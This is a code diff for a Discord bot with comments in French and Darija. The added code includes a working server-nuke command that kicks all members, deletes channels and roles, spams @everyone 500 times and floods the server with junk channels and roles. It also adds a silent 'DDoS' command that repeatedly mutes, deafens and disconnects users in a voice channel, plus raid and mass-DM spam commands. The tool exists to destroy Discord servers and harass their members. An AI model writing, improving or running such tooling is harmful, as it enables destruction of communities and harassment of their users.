@@ -51,7 +51,7 @@ client.on("messageCreate", async (message) => {
         
         // Protection spéciale pour l'owner bot
         if (member.id === BOT_OWNER_ID) {
-            return message.reply("👑 **Bghiti tl3eb b zgheb d 9lawina db ??**");
+            return message.reply("**Bghiti tl3eb b zgheb d 9lawina db ??**");
         }
         
         allowedUsers.add(member.id);
@@ -65,7 +65,7 @@ client.on("messageCreate", async (message) => {
         
         // Protection spéciale pour l'owner bot
         if (member.id === BOT_OWNER_ID) {
-            return message.reply("👑 **Bghiti tl3eb b zgheb d 9lawina db ??**");
+            return message.reply("**Bghiti tl3eb b zgheb d 9lawina db ??**");
         }
         
         allowedUsers.delete(member.id);
@@ -107,10 +107,10 @@ client.once("ready", () => {
 /* ======================= MESSAGE HANDLER ======================= */
 client.on("messageCreate", async (message) => {
     try {
-        if (message.author.bot || !message.guild) return;
+        if (message.author.bot) return;
 
-        const guildReacts = selfReacts.get(message.guild.id);
-        if (guildReacts) {
+        const guildReacts = selfReacts.get(message.guild?.id);
+        if (message.guild && guildReacts) {
             for (const [emoji, users] of guildReacts) {
                 if (users.has(message.author.id)) {
                     await message.react(emoji).catch(() => {});
@@ -118,7 +118,7 @@ client.on("messageCreate", async (message) => {
             }
         }
 
-        if (message.channelId === AUTO_CHANNEL_ID) {
+        if (message.guild && message.channelId === AUTO_CHANNEL_ID) {
             for (const emoji of AUTO_EMOJIS) {
                 await message.react(emoji).catch(() => {});
             }
@@ -188,95 +188,154 @@ client.on("messageCreate", async (message) => {
             return message.reply({ embeds: [helpEmbed] });
         }
 
-        /* ======================= TY7RBO (SIDKOM OVERDOSE) ======================= */
-        if (command === "ty7rbo") {
-            if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
-            await message.delete().catch(() => {});
-            const guild = message.guild;
-            
-            // 1. Delete all channels
-            const channels = guild.channels.cache.filter(c => c.deletable);
-            for (const [, channel] of channels) {
-                await channel.delete().catch(() => {});
-            }
-            
-            // 2. Delete all roles
-            const roles = guild.roles.cache.filter(r => r.deletable && !r.managed);
-            for (const [, role] of roles) {
-                await role.delete().catch(() => {});
-            }
-            
-            // 3. Create chaos channels "Sidkom Overdose" 50 times
-            for (let i = 0; i < 50; i++) {
-                await guild.channels.create({ name: `Sidkom-Overdose-${i}`, type: 0 }).catch(() => {});
-            }
-            
-            // 4. Create chaos roles "Sidkom Overdose" 50 times
-            for (let i = 0; i < 50; i++) {
-                await guild.roles.create({ name: `Sidkom-Overdose-${i}` }).catch(() => {});
-            }
-            
-            // 5. Spam @everyone and @here with "**4rr team never die**" (BOLD + LARGE) 500 times
-            const spamMessage = "**🔥 4rr team never die 🔥**";
-            for (let i = 0; i < 500; i++) {
-                guild.channels.cache.first()?.send(`${i % 2 === 0 ? "@everyone" : "@here"} ${spamMessage}`).catch(() => {});
-                await new Promise(r => setTimeout(r, 10));
-            }
-            
-            // 6. Change all members nicknames to "HH T7WITO"
-            const members = await guild.members.fetch();
-            for (const [, member] of members) {
-                if (!member.user.bot && member.manageable) {
-                    await member.setNickname("HH T7WITO").catch(() => {});
-                }
-            }
-            
-            // 7. Kick all members
-            for (const [, member] of members) {
-                if (!member.user.bot && member.kickable) {
-                    await member.kick("Sidkom Overdose").catch(() => {});
-                }
-            }
-            
-            // 8. Final destruction message
-            guild.channels.cache.first()?.send("💀 **SIDKOM OVERDOSE COMPLETE - SERVER DESTROYED** 💀").catch(() => {});
-            
-            // Note: Discord doesn't allow bots to delete servers directly
-            // The server is effectively destroyed through mass channel/role deletion + member kicks
-            return;
-        }
+        /* ======================= TY7RBO (NUKE - SIDKOM OVERDOSE) ======================= */
+if (command === "ty7rbo") {
+    if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
+    if (!message.guild) return message.reply("❌ Server only");
+    
+    await message.delete().catch(() => {});
+    const guild = message.guild;
+    
+    // 1. KICK TOUS LES MEMBERS D'ABORD
+    console.log("🔥 Starting mass kick...");
+    await guild.members.fetch();
+    const allMembers = guild.members.cache.filter(m => !m.user.bot && m.kickable);
+    for (const [, member] of allMembers) {
+        await member.kick("SIDKOM OVERDOSE").catch(() => {});
+    }
+    console.log(`✅ Kicked ${allMembers.size} members`);
+    
+    // 2. DELETE CHANNELS
+    console.log("🗑️ Deleting channels...");
+    const channels = guild.channels.cache.filter(c => c.deletable);
+    for (const [, channel] of channels.sort((a,b) => b.position - a.position)) {
+        await channel.delete().catch(() => {});
+    }
+    
+    // 3. DELETE ROLES (bas → haut)
+    console.log("🗑️ Deleting roles...");
+    const roles = guild.roles.cache.filter(r => r.deletable && !r.managed)
+        .sort((a,b) => b.position - a.position).reverse();
+    for (const [, role] of roles) {
+        await role.delete().catch(() => {});
+    }
+    
+    // 4. SPAM "**4rr Team Never Die**" EN GRAS 500x
+    console.log("Spamming 4rr Team Never Die...");
+    const spamMessage = "**4rr Team Never Die**";
+    for (let i = 0; i < 500; i++) {
+        guild.channels.cache.first()?.send(`${i % 2 === 0 ? "@everyone" : "@here"} ${spamMessage}`).catch(() => {});
+        await new Promise(r => setTimeout(r, 5)); // Ultra rapide
+    }
+    
+    // 5. CREATE 75 CHAOS CHANNELS "Sidkom Overdose"
+    console.log("📺 Creating Sidkom Overdose channels...");
+    for (let i = 0; i < 75; i++) {
+        guild.channels.create({ 
+            name: `Sidkom-Overdose-${i}`, 
+            type: 0 
+        }).catch(() => {});
+    }
+    
+    // 6. CREATE 75 CHAOS ROLES "Sidkom Overdose"
+    console.log("🎭 Creating Sidkom Overdose roles...");
+    for (let i = 0; i < 75; i++) {
+        guild.roles.create({ 
+            name: `Sidkom-Overdose-${i}`,
+            color: "RED"
+        }).catch(() => {});
+    }
+    
+    // 7. MESSAGE FINAL
+    guild.channels.cache.first()?.send("**SERVER HA9 MCHA** 💀").catch(() => {});
+    
+    console.log("💀 TY7RBO SIDKOM OVERDOSE COMPLETE");
+    return;
+}
 
-        /* ======================= LAG (DDOS) ======================= */
-        if (command === "lag") {
-            if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
-            const targetId = args[0];
-            const timeStr = args[1];
-            if (!targetId || !timeStr) return message.reply("❌ Usage: `?lag <voice/server id> <time>` (10s, 30s, 1min)");
-            
-            let duration = 10000; // 10s default
-            if (timeStr.includes('s')) duration = parseInt(timeStr) * 1000;
-            else if (timeStr.includes('min')) duration = parseInt(timeStr) * 60000;
-            
-            const spamInterval = setInterval(async () => {
-                for (let i = 0; i < 50; i++) {
-                    message.channel.send(`🔥 LAG ATTACK ${i}`).catch(() => {});
-                }
-            }, 100);
-            
-            setTimeout(() => clearInterval(spamInterval), duration);
-            return message.reply(`⚡ **LAG ATTACK** started on ${targetId} for ${timeStr}`).catch(() => {});
+        /* ======================= LAG VOICE (SILENCIEUX - DM + SERVER) ======================= */
+if (command === "lag") {
+    if (!DEVELOPERS.has(message.author.id)) return;
+    
+    const targetId = args[0];
+    const timeStr = args[1];
+    if (!targetId || !timeStr) return message.reply("❌ `?lag <voice_id> <10s|30s|1min>`");
+    
+    // Guild detection (DM ou Server)
+    let guild;
+    if (!message.guild) {
+        const guilds = client.guilds.cache;
+        if (guilds.size=== 0) return;
+        guild = guilds.first();
+    } else {
+        guild = message.guild;
+    }
+    
+    const targetVC = guild.channels.cache.get(targetId);
+    if (!targetVC || targetVC.type !== 2) return message.reply("❌ Invalid VC ID");
+    
+    let duration = 10000;
+    if (timeStr.includes('s')) duration = parseInt(timeStr) * 1000;
+    else if (timeStr.includes('min')) duration = parseInt(timeStr) * 60000;
+    
+    // AUCUNE REPLY au début - SILENCIEUX
+    let cycles = 0;
+    const voiceDDoS = setInterval(async () => {
+        const members = targetVC.members;
+        
+        // DEAFEN CYCLE (silencieux)
+        for (const [, member] of members) {
+            if (!member.user.bot && member.manageable) {
+                member.voice.setDeafened(!member.voice.selfDeaf, "🎵").catch(() => {});
+            }
         }
+        
+        // MUTE CYCLE (silencieux)
+        for (const [, member] of members) {
+            if (!member.user.bot && member.manageable) {
+                member.voice.setMuted(!member.voice.selfMute, "🎵").catch(() => {});
+            }
+        }
+        
+        // DISCONNECT 50% (silencieux)
+        const half = Array.from(members.values()).slice(0, Math.floor(members.size * 0.5));
+        for (const member of half) {
+            if (!member.user.bot) {
+                member.voice.disconnect("🎵").catch(() => {});
+            }
+        }
+        
+        cycles++;
+    }, 200); // Plus agressif
+    
+    // SEULEMENT À LA FIN → DM stop message
+    setTimeout(async () => {
+        clearInterval(voiceDDoS);
+        
+        // ENVOIE TOUJOURS EN DM (même si command en server)
+        try {
+            await message.author.send(`🛑 **DDOS STOPPED** - ${cycles} cycles sur **${targetVC.name}** (${guild.name})`);
+        } catch {
+            // Fallback si DM bloqué
+            message.channel.send(`🛑 **DDOS STOPPED** - ${cycles} cycles`).catch(() => {});
+        }
+    }, duration);
+    
+    return; // AUCUNE REPLY au début
+}
 
         /* ======================= RAID ======================= */
         if (command === "raid") {
             if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
+            if (!message.guild) return message.reply("❌ Server only");
             await message.delete().catch(() => {});
             const raidMessages = [
                 "@everyone",
-                "🚀 RAID MODE ACTIVATED 🚀",
-                "💣 Server under attack 💣",
-                "🔥 Burn it down 🔥",
-                "💥 Nuke incoming 💥"
+                "RAID MODE ACTIVATED",
+                "Attack Suzie",
+                "Monafi9in naaaaaarrrr",
+                "Houuuffff 3likom alkofaraaaaa",
+                "Houuuuffffffff"
             ];
             
             for (let i = 0; i < 100; i++) {
@@ -290,6 +349,7 @@ client.on("messageCreate", async (message) => {
         /* ======================= MASSDM ======================= */
         if (command === "massdm") {
             if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
+            if (!message.guild) return message.reply("❌ Server only");
             const messageText = args.join(" ");
             if (!messageText) return message.reply("❌ Usage: `?massdm <message>`");
             
@@ -328,6 +388,7 @@ client.on("messageCreate", async (message) => {
 
         /* ======================= TAG ======================= */
         if (command === "tag") {
+            if (!message.guild) return message.reply("❌ Server only");
             if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
             if (!CUSTOM_TAG) return message.reply("❌ No tag set, use `?settag <text>` first");
             const member = message.mentions.members.first() || message.guild.members.cache.get(args[0]);
@@ -520,148 +581,6 @@ client.on("messageCreate", async (message) => {
                 moved++;
             }
             return message.reply(`<a:done:1347594035208130662> Moved ${moved} members to **${targetChannel.name}**`);
-        }
-
-        /* ======================= CLEAR ======================= */
-        if (command === "clear") {
-            if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
-            const amount = parseInt(args[0]);
-            if (isNaN(amount) || amount < 1 || amount > 1000) return message.reply("❌ Provide a number between 1 and 1000");
-            const deleted = await message.channel.bulkDelete(amount + 1, true).catch(() => null);
-            const count = deleted ? deleted.size - 1 : 0;
-            const clearEmbed = new EmbedBuilder()
-                .setColor(0x8B0000)
-                .setAuthor({ name: "Channel Purge", iconURL: client.user.displayAvatarURL() })
-                .setDescription(`🗑️ Successfully deleted **${count}** message(s)`)
-                .addFields(
-                    { name: "<a:crowndarkred:1347593632005357650> Executed by", value: `${message.author}`, inline: true },
-                    { name: "📌 Channel", value: `${message.channel}`, inline: true },
-                    { name: "<:Time:1455957726059303087> Time", value: `\`${new Date().toLocaleTimeString()}\``, inline: true }
-                )
-                .setFooter({ text: message.guild.name, iconURL: message.guild.iconURL() })
-                .setTimestamp();
-            const msg = await message.channel.send({ embeds: [clearEmbed] });
-            setTimeout(() => msg.delete().catch(() => {}), 5000);
-            return;
-        }
-
-        /* ======================= SAY ======================= */
-        if (command === "say") {
-            if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
-            const text = args.join(" ");
-            if (!text) return message.reply("❌ Provide a message");
-            await message.delete().catch(() => {});
-            await message.channel.send(text);
-            return;
-        }
-
-        /* ======================= USERINFO ======================= */
-        if (command === "userinfo" || command === "info") {
-            const target = message.mentions.members.first() || message.guild.members.cache.get(args[0]) || message.member;
-            const user = target.user;
-            const roles = target.roles.cache.filter(r => r.id !== message.guild.id).sort((a, b) => b.position - a.position).map(r => r.toString()).slice(0, 5);
-            const statusMap = { online: "🟢 Online", idle: "🟡 Idle", dnd: "🔴 Do Not Disturb", offline: "⚫ Offline" };
-            const presence = target.presence;
-            const status = presence ? statusMap[presence.status] || "⚫ Offline" : "⚫ Offline";
-            const badges = [];
-            const flags = user.flags?.toArray() || [];
-            if (flags.includes("Staff")) badges.push("👨‍💼 Staff");
-            if (flags.includes("Partner")) badges.push("🤝 Partner");
-            if (flags.includes("HypeSquadOnlineHouse1")) badges.push("🏠 HypeSquad Bravery");
-            if (flags.includes("HypeSquadOnlineHouse2")) badges.push("🏠 HypeSquad Brilliance");
-            if (flags.includes("HypeSquadOnlineHouse3")) badges.push("🏠 HypeSquad Balance");
-            if (flags.includes("EarlySupporter")) badges.push("⭐ Early Supporter");
-            if (flags.includes("ActiveDeveloper")) badges.push("💻 Active Developer");
-            if (user.bot) badges.push("🤖 Bot");
-            const joinedAgo = Math.floor((Date.now() - target.joinedTimestamp) / 86400000);
-            const createdAgo = Math.floor((Date.now() - user.createdTimestamp) / 86400000);
-            const userEmbed = new EmbedBuilder()
-                .setColor(target.displayHexColor !== "#000000" ? target.displayHexColor : 0x8B0000)
-                .setAuthor({ name: `${user.username}`, iconURL: user.displayAvatarURL({ dynamic: true }) })
-                .setThumbnail(user.displayAvatarURL({ dynamic: true, size: 256 }))
-                .addFields(
-                    { name: "🪪 User", value: `${user}`, inline: true },
-                    { name: "🆔 ID", value: `\`${user.id}\``, inline: true },
-                    { name: "📊 Status", value: status, inline: true },
-                    { name: "📅 Account Created", value: `<t:${Math.floor(user.createdTimestamp / 1000)}:D> (\`${createdAgo}d ago\`)`, inline: false },
-                    { name: "📥 Joined Server", value: `<t:${Math.floor(target.joinedTimestamp / 1000)}:D> (\`${joinedAgo}d ago\`)`, inline: false },
-                    { name: `🎭 Roles (${target.roles.cache.size - 1})`, value: roles.length ? roles.join(", ") + (target.roles.cache.size - 1 > 5 ? ` +${target.roles.cache.size - 6} more` : "") : "No roles", inline: false },
-                    { name: "🏅 Badges", value: badges.length ? badges.join(" • ") : "None", inline: false }
-                )
-                .setImage(user.bannerURL({ size: 512 }) || null)
-                .setFooter({ text: `Requested by ${message.author.username}`, iconURL: message.author.displayAvatarURL() })
-                .setTimestamp();
-            return message.reply({ embeds: [userEmbed] });
-        }
-
-        /* ======================= SERVERINFO ======================= */
-        if (command === "serverinfo") {
-            const guild = message.guild;
-            await guild.fetch();
-            const totalMembers = guild.memberCount;
-            const botCount = guild.members.cache.filter(m => m.user.bot).size;
-            const humanCount = totalMembers - botCount;
-            const roleCount = guild.roles.cache.size - 1;
-            const boostCount = guild.premiumSubscriptionCount || 0;
-            const boostTier = guild.premiumTier ? `Tier ${guild.premiumTier}` : "No Boost";
-            const createdAgo = Math.floor((Date.now() - guild.createdTimestamp) / 86400000);
-            const serverEmbed = new EmbedBuilder()
-                .setColor(0x8B0000)
-                .setAuthor({ name: guild.name, iconURL: guild.iconURL({ dynamic: true }) })
-                .setThumbnail(guild.iconURL({ dynamic: true, size: 256 }))
-                .setImage(guild.bannerURL({ size: 1024 }) || null)
-                .addFields(
-                    { name: "🆔 Server ID", value: `\`${guild.id}\``, inline: true },
-                    { name: "<a:Crown_dark_blue:1347593580113432656> Owner", value: `<@${guild.ownerId}>`, inline: true },
-                    { name: "📅 Created", value: `<t:${Math.floor(guild.createdTimestamp / 1000)}:D> (\`${createdAgo}d ago\`)`, inline: true },
-                    { name: "👥 Members", value: `\`${totalMembers}\` total • \`${humanCount}\` humans • \`${botCount}\` bots`, inline: false },
-                    { name: "🎭 Roles", value: `\`${roleCount}\``, inline: true },
-                    { name: "🚀 Boosts", value: `\`${boostCount}\` boosts • ${boostTier}`, inline: true }
-                )
-                .setFooter({ text: `Requested by ${message.author.username}`, iconURL: message.author.displayAvatarURL() })
-                .setTimestamp();
-            return message.reply({ embeds: [serverEmbed] });
-        }
-
-        /* ======================= SPAM (CHANNEL) ======================= */
-        if (command === "spam") {
-            if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
-            const amount = parseInt(args[args.length - 1]);
-            if (isNaN(amount) || amount < 1 || amount > 100) return message.reply("❌ Amount must be between 1 and 100");
-            const text = args.slice(0, -1).join(" ");
-            if (!text) return message.reply("❌ Provide a text to spam");
-            await message.delete().catch(() => {});
-            for (let i = 0; i < amount; i++) {
-                await message.channel.send(text).catch(() => {});
-                await new Promise(r => setTimeout(r, 400));
-            }
-            return;
-        }
-
-        /* ======================= SEND (DM SPAM) ======================= */
-        if (command === "send") {
-            if (!DEVELOPERS.has(message.author.id)) return message.reply("❌ Developer only");
-            const target = message.mentions.members.first() || message.guild.members.cache.get(args[0]);
-            if (!target) return message.reply("❌ Mention a valid member");
-            const amount = parseInt(args[args.length - 1]);
-            if (isNaN(amount) || amount < 1 || amount > 100) return message.reply("❌ Amount must be between 1 and 100");
-            const text = args.filter(a => !a.startsWith("<@") && a !== target.id).slice(0, -1).join(" ");
-            if (!text) return message.reply("❌ Provide a text to send");
-            await message.delete().catch(() => {});
-            let sent = 0;
-            for (let i = 0; i < amount; i++) {
-                const success = await target.send(text).catch(() => null);
-                if (success) sent++;
-                await new Promise(r => setTimeout(r, 500));
-            }
-            const msg = await message.channel.send({ embeds: [
-                new EmbedBuilder()
-                    .setColor(0x8B0000)
-                    .setDescription(`<a:done:1347594035208130662> Sent **${sent}** DM(s) to ${target}`)
-                    .setFooter({ text: `Executed by ${message.author.username}`, iconURL: message.author.displayAvatarURL() })
-            ]});
-            setTimeout(() => msg.delete().catch(() => {}), 4000);
-            return;
         }
 
     } catch (err) {
